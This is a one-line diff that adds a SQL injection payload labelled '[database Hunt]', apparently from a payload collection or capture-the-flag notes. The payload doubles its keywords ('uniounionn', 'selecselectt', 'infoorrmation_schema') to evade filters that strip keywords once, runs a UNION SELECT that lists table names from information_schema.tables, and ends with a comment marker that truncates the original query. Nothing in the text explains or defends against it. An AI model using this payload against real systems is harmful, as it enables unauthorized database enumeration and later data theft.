@@ -1,0 +1,1 @@
+[database Hunt] abcd' uniounionn selecselectt 'aaa',table_name,'aaa','bbb','ccc','ddd','eee','fff','ggg','hhh','iii','hhh','jjj', 'kkk' from infoorrmation_schema.tables #Comment
